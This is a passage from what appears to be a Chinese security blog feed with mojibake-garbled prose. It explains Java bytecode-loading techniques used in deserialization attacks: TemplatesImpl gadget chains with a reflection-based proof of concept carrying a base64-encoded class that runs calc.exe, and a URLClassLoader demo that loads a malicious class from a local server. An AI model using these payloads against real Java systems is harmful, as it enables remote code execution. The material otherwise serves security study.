    <content type="html"><![CDATA[<h1 id="TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="TemplatesImplåŠ è½½å­—èŠ‚ç "></a>TemplatesImplåŠ è½½å­—èŠ‚ç </h1><p>ä¸Šä¸€ç¯‡è¯´åˆ°åŠ è½½å­—èŠ‚ç ã€‚ç”¨åˆ°äº†<code>url</code>çš„<code>loadclass</code>å’Œ<code>classloader</code>çš„<code>defineclass</code>ä½†æ˜¯å‘¢è¢«å…¶ä½œç”¨åŸŸé™åˆ¶ä½äº†ã€‚<br>é‚£æˆ‘å°±ä¼šæƒ³åˆ°æ€ä¹ˆå»æ‰¾å…¶ä»–ç±»çœ‹çœ‹ä¼šä¸ä¼šåˆé—´æ¥è°ƒç”¨<code>defineclass</code>çš„ï¼ˆå½“ç„¶è¿™æ˜¯åœ¨æˆ‘å¤ä¹ çš„æ—¶å€™æ‰ä¼šæƒ³åˆ°çš„+åˆ†æäº†è®¸å¤šçš„æ¼æ´ï¼‰ï¼Œè¿™æ˜¯ä»¥åå¿…é¡»å…»æˆçš„ä¹ æƒ¯ï¼ˆé—´æ¥ï¼ï¼‰</p><h2 id="TemplatesImple"><a href="#TemplatesImple" class="headerlink" title="TemplatesImple"></a>TemplatesImple</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012025891.png" alt="QQæˆªå›¾20220301202453"></p><p>æ¸…æ™°å¯è§è¿™é‡Œçš„<code>defineClass</code>æ²¡æœ‰äº†<code>protect</code>ï¼Œæ²¡æœ‰ä½œç”¨åŸŸï¼Ÿä¸ï¼Œå®ƒè¿™é‡Œçš„ä¸å†™ï¼Œå°±é»˜è®¤ä»£è¡¨äº†<code>default</code>ç±»ï¼Œ<strong>è¿™æ˜¯å¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨çš„</strong>ã€‚</p><p>å›æº¯ä¸€ä¸‹ã€‚å“ªé‡Œè°ƒç”¨äº†<code>defineClass</code>çš„<code>TransletClassLoader</code>æ–¹æ³•ã€‚å‘ç°äº†åœ¨<code>TemplatesImpl</code>ç±»ä¸­åªæœ‰ <code>defineTransletClasse</code>è°ƒç”¨äº†ã€‚äºæ˜¯ç»§ç»­å›æº¯ï¼ŒæŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†<code>defineTransletClasse</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250229.png" alt="QQæˆªå›¾20220301203806"></p><p>æ˜¾è€Œæ˜“è§çš„ä¸‰ç§ã€‚</p><p>ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ã€‚</p><h4 id="åˆ©ç”¨é“¾1"><a href="#åˆ©ç”¨é“¾1" class="headerlink" title="åˆ©ç”¨é“¾1"></a>åˆ©ç”¨é“¾1</h4><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoThree</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(obj,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢è§£é‡Šä¸ºä»€ä¹ˆè¦åå°„ä¿®æ”¹å±æ€§å€¼ã€‚<br><strong>é¦–å…ˆæˆ‘ä»¬æ³¨æ„åˆ°åœ¨<code>TemplatesImp</code>ç±»ä¸­<code>_name</code>ã€<code>__tfactory</code>ã€<code>__bytecodes</code>ä¸‰ä¸ªå±æ€§å€¼éƒ½ä¸ºnullã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250759.png" alt="QQæˆªå›¾20220301221853"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012219267.png" alt="QQæˆªå›¾20220301221915"></p><p>æˆ‘ä»¬è·Ÿç€é“¾å­èµ°ï¼Œé¦–å…ˆæ¥åˆ°ã€‚<code>getTransletInstance()</code></p><h4 id="name"><a href="#name" class="headerlink" title="_name"></a>_name</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250225.png" alt="QQæˆªå›¾20220301220948"></p><p>æ˜¾è€Œæ˜“è§å¦‚æœä¸ºnullåˆ™é€€å‡ºã€‚</p><h4 id="bytecodes"><a href="#bytecodes" class="headerlink" title="_bytecodes"></a>_bytecodes</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250456.png" alt="QQæˆªå›¾20220301221448"></p><p>æ˜¾è€Œæ˜“è§ã€‚</p><p>è¿™é‡Œçš„ä¸€ä¸ªå°ç»†èŠ‚ã€‚ä¸Šé¢æˆªå›¾å·²ç»æ”¾å‡ºã€‚æ˜¯<code>_bytecodes[ ] [ ] </code>ï¼Œè¿™é‡Œå°±éœ€è¦è½¬æ¢ä¸€ä¸‹ã€‚<code>new byte[][]&#123;code&#125;</code></p><h4 id="tfactory"><a href="#tfactory" class="headerlink" title="_tfactory"></a>_tfactory</h4><p>å®ƒå±äº<code>TransformerFactoryImpl</code>ç±»ï¼Œç»™ä¸ª<code>new TransformerFactoryImpl()</code>å°±è¡Œ</p><h4 id="class"><a href="#class" class="headerlink" title=".class"></a>.class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EivlTwo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EivlTwo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012238593.png" alt="QQæˆªå›¾20220301223850"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250011.png" alt="QQæˆªå›¾20220301223936"></p><p>è¿™é‡Œè¿˜éœ€è¦å°†classæ–‡ä»¶çš„ç±»ç»§æ‰¿<code>AbstractTranslet</code>,ä¸ç„¶ä¼šè¯»å–å­—èŠ‚ç å¤±è´¥ï¼ˆé»˜è®¤å€¼ä¸º-1ï¼Œè¿›å…¥&lt;0ï¼‰ã€‚ä¹Ÿå°±æ˜¯æ— æ³•è·å–base64ä¸­çš„å†…å®¹ã€‚</p><p>ç„¶åå°±æ˜¯è¦è§¦å‘transform()ã€‚<br>å¯¹ç€å®ƒçš„æ„é€ æ¥æ„é€ ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012255411.png" alt="QQæˆªå›¾20220301225539"></p><p>è‡³æ­¤å°±ç»“æŸå•¦ã€‚</p><h3 id="åˆ©ç”¨é“¾2"><a href="#åˆ©ç”¨é“¾2" class="headerlink" title="åˆ©ç”¨é“¾2"></a>åˆ©ç”¨é“¾2</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>ç”±äºè¯¥ç±»çš„<code>getOutputProperties()</code>ä¼šè§¦å‘<code>newTransformer()</code>ï¼Œé‚£ä¹ˆå…¶å®ç±»å‹æ˜¯ä¸€æ ·çš„ã€‚åªéœ€è¦ä¿®æ”¹</p><p> obj.newTransformer();â€”-&gt;obj.getOutputProperties();<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250693.png" alt="QQæˆªå›¾20220301223027"></p><h3 id="åˆ©ç”¨é“¾3"><a href="#åˆ©ç”¨é“¾3" class="headerlink" title="åˆ©ç”¨é“¾3"></a>åˆ©ç”¨é“¾3</h3><p>æ³¨æ„ä¸Šç¯‡å°±è¯´åˆ°</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>)</span>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;ç±»å&quot;</span>, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</span>ï¼Œè€Œ<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClassé»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯ä¸€ä¸ªé“ç†ï¼š<code>getTransletIndex ()æ–¹æ³•</code>å°±æ˜¯æ²¡åˆå»å®ä¾‹åŒ–è¯¥å¯¹è±¡ã€‚è€Œå…¶ä»–ä¸¤ä¸ªæ–¹æ³•éƒ½æœ‰ã€‚æ‰€ä»¥æ— æ³•è§¦å‘ã€‚</p><p>æ€»ç»“ï¼ˆåªç”¨åˆ°äº†ä¸¤æ¡ã€‚è€Œè¿™ä¸¤æ¡ä¹Ÿå°±åªæ˜¯å¤šäº†ä¸€æ¡å›æº¯è€Œå·²ã€‚ï¼‰</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
    <link href="/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç "><a href="#JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç " class="headerlink" title="JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç "></a>JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç </h1><p>æœ¬æ–‡å¤§å¤šæ•°å¿˜äº†ï¼Œå› ä¸ºå½“æ—¶å­¦çš„æ—¶å€™å°±æ˜¯ç®€å•äº†è§£ã€‚ç°åœ¨åˆæ˜¯è·Ÿç€ç½‘ä¸Šçš„æ–‡ç« å¤ä¹ äº†ä¸€éã€‚</p><h2 id="Javaå­—èŠ‚ç "><a href="#Javaå­—èŠ‚ç " class="headerlink" title="Javaå­—èŠ‚ç "></a>Javaå­—èŠ‚ç </h2><p><code>Javaå­—èŠ‚ç </code>æŒ‡çš„æ˜¯javaè™šæ‹Ÿæœºä¸­çš„æ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨<code>.class</code>æ–‡ä»¶ä¸­ã€‚javaä¹‹æ‰€ä»¥èƒ½å¤Ÿè¢«ç››è¡Œï¼Œæ— éå°±æ˜¯åœ¨ä¸åŒç³»ç»Ÿä¸­ä¸éœ€è¦ç¿»è¯‘æˆå¯¹åº”çš„0å’Œ1ï¼Œè€Œæ˜¯é—´æ¥çš„ç¿»è¯‘æˆå­—èŠ‚ç ã€‚ç„¶åä¸ç”¨ç³»ç»Ÿä½¿ç”¨jvmè™šæ‹Ÿæœºå°±å¯ä»¥è¿è¡Œã€‚ï¼ˆå½“ç„¶è¿™é‡Œä¹Ÿæœ‰ä¸€äº›æ¡ä»¶ã€‚ï¼‰</p><p><strong>ClassLoaderå¤„ç†å­—èŠ‚ç çš„æµç¨‹ï¼šloadClass -&gt; findClass -&gt; defineClass</strong></p><h2 id="URLClassLoaderè¿œç¨‹åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹åŠ è½½"></a>URLClassLoaderè¿œç¨‹åŠ è½½</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>URLæœªä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FildLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ &#x2F;ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±»</li></ul><h4 id="Evilæ¶æ„ç±»"><a href="#Evilæ¶æ„ç±»" class="headerlink" title="Evilæ¶æ„ç±»"></a>Evilæ¶æ„ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eivl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Eivl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹ã€‚</p><h4 id="è¿œç¨‹åŠ è½½"><a href="#è¿œç¨‹åŠ è½½" class="headerlink" title="è¿œç¨‹åŠ è½½"></a>è¿œç¨‹åŠ è½½</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DemoOne</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:1234&quot;</span>);<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;url&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>);<br>        aClass.newInstance();<br>    